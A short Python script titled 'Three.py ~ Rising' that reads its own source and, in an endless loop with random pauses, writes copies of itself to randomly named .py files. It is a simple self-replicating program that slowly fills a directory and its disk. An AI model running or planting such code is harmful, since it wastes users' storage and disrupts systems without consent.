# Three.py ~ Rising

from time import sleep
from random import random

mom = open(__file__).read()

while True:
    child = open(str(random()) + '.py', 'w')
    child.write(mom)
    child.close()
    sleep(random()*10)
